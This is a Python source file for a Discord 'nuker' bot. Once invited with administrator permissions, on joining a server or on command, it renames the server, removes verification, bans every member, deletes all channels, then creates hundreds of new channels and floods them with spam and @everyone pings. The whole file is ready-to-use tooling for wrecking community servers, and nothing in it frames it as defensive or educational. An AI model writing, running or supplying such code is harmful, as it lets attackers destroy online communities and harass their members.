from colorama.initialise import init
import discord
from discord.ext import commands
from colorama import Fore
import json
import time

with open("config.json", "r") as f:
    f = json.load(f)


token = f.get("token")
nuke_on_join = f.get("nuke_on_join")
guild_name = f.get("guild_name")
ban_all = f.get("ban_all")
channel_name = f.get("channel_name")
channel_name2 = f.get("channel_name2")
text = f.get("text")
reason = f.get("audit_log_reason")

init()

intents = discord.Intents.all()
client = commands.Bot(command_prefix=".", intents=intents)
client.remove_command('help')


class COLORS:
    r = Fore.LIGHTRED_EX
    g = Fore.LIGHTGREEN_EX
    b = Fore.LIGHTBLUE_EX
    m = Fore.LIGHTMAGENTA_EX
    c = Fore.LIGHTCYAN_EX
    y = Fore.LIGHTYELLOW_EX
    w = Fore.RESET


@client.event
async def on_ready():
    print(f'''
                    {COLORS.b}                     ███▄    █  █    ██  ▀██ ▄█▀▓█████ ██▀███  
                    {COLORS.b}                     ██ ▀█   █  ██  ▓██▒  ██▄█▒ ▓█   ▀▓██ ▒ ██▒
                    {COLORS.b}                   ▓██  ▀█ ██▒▓██  ▒██░ ▓███▄░ ▒███  ▓██ ░▄█ ▒
                    {COLORS.b}                    ▓██▒  ▐▌██▒▓▓█  ░██░ ▓██ █▄ ▒▓█  ▄▒██▀▀█▄  
                    {COLORS.b}                    ▒██░   ▓██░▒▒█████▓  ▒██▒ █▄░▒████░██▓ ▒██▒
                    {COLORS.b}                    ░ ▒░   ▒ ▒  ▒▓▒ ▒ ▒  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒▓ ░▒▓░
                    {COLORS.b}                    ░ ░░   ░ ▒░ ░▒░ ░ ░  ░ ░▒ ▒░ ░ ░    ░▒ ░ ▒░
                    {COLORS.b}                       ░   ░ ░   ░░ ░ ░  ░ ░░ ░    ░     ░   ░ 
                    {COLORS.b}                             ░    ░      ░  ░      ░     ░     


                                            {Fore.RESET}Logged in as {client.user}
                                            Prefix: {client.command_prefix}

                                            {COLORS.b}Made by https://github.com/hris69{Fore.RESET}''')
    time.sleep(2)
    print(f''' 

        CONFIGURATION:
        {COLORS.b}|  [NUKE ON JOIN] - {COLORS.w}{nuke_on_join}
        {COLORS.b}|  [GUILD NAME] - {COLORS.w}{guild_name}
        {COLORS.b}|  [BAN ALL] - {COLORS.w}{ban_all}
        {COLORS.b}|  [CHANNEL NAME] - {COLORS.w}{channel_name}
        {COLORS.b}|  [SECOND CHANNEL NAME] - {COLORS.w}{channel_name2}    
        {COLORS.b}|  [TEXT] - {COLORS.w}{text}
        {COLORS.b}|  [REASON] - {COLORS.w}{reason}
    

        Type {client.command_prefix}help for help. You can now nuke servers.
    ''')
    input1 = input(f"        Do you want to {COLORS.y}copy{Fore.RESET} the bot invite, if so enter 1: ")
    if input1 == "1":
        import pandas as pd
        df=pd.DataFrame([f'https://discord.com/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot'])
        df.to_clipboard(index=False, header=False)
        print(f"        {COLORS.g}Invite Link copied!{COLORS.w}")
    else:
        pass


@client.command()
async def help(ctx):
    await ctx.message.delete()
    print("\nHelp command:\nNuke - nukes whole server\nspam [channel] - Spams 100 times @everyone ping\nbanall - Bans everyone in the server\ncc - Deletes every channel\nmember - Displays member count\n")

@client.event
async def on_guild_join(guild):
    if nuke_on_join == "yes" or nuke_on_join == "Yes":
        try:
            await guild.edit(name=guild_name, verification_level=discord.VerificationLevel.none)
        except:
            pass
        if guild.name == guild_name:
            print(f"{COLORS.g}[!] Edited Guild Name")
        if discord.VerificationLevel.none:
            print(f"{COLORS.g}[!] Edited Verification Level to NONE\n")
        if ban_all == "yes" or banall == "Yes":
            for members in guild.members:
                try:
                        await members.ban(reason=reason)
                        print(f"{COLORS.r}[!] Banned {members}")
                except:
                    pass
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"{COLORS.m}[!] Deleted channel #{channel}")
            except:
                pass
        for i in range(200):
            try:
                await guild.create_text_channel(name=channel_name, reason=reason)
            except:
                print(f"{COLORS.r}[!] Could not create channel.{Fore.RESET}")
            if channel_name2 != '':
                try:
                    await guild.create_text_channel(name=channel_name2, reason=reason)
                except:
                    print(f"{COLORS.r}[!] Could not create second channel.{Fore.RESET}")

        


@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    try:
        await ctx.guild.edit(name=guild_name, verification_level=discord.VerificationLevel.none)
    except:
            pass
    if ctx.guild.name == guild_name:
            print(f"{COLORS.g}[!] Edited Guild Name")
    if discord.VerificationLevel.none:
            print(f"{COLORS.g}[!] Edited Verification Level to NONE\n")
    if ban_all == "yes" or banall == "Yes":
            for members in ctx.guild.members:
                try:
                        await members.ban(reason=reason)
                        print(f"{COLORS.r}[!] Banned {members}")
                except:
                    pass
    for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"{COLORS.m}[!] Deleted channel #{channel}")
            except:
                pass
    for i in range(200):
            try:
                await ctx.guild.create_text_channel(name=channel_name, reason=reason)
            except:
                print(f"{COLORS.r}[!] Could not create channel.{Fore.RESET}")
            if channel_name2 != '':
                try:
                    await ctx.guild.create_text_channel(name=channel_name2, reason=reason)
                except:
                    print(f"{COLORS.r}[!] Could not create second channel.{Fore.RESET}")


@client.event
async def on_guild_channel_create(channel):
    for i in range(15):
        await channel.send(text)

@client.command()
async def spam(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    for i in range(100):
        await channel.send("@everyone")


@client.command(aliases=['ba'])
async def banall(ctx):
    await ctx.message.delete()
    for members in ctx.guild.members:
            try:
                    await members.ban(reason=reason)
                    print(f"{COLORS.r}[!] Banned {members}")
            except:
                pass


@client.command(aliases=['clear_channels'])
async def cc(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{COLORS.g}[!] Deleted channel #{channel}")
        except:
            pass


@client.command()
async def member(ctx):
    await ctx.message.delete()
    await ctx.send(f"member count: {ctx.guild.member_count}")


client.run(token)
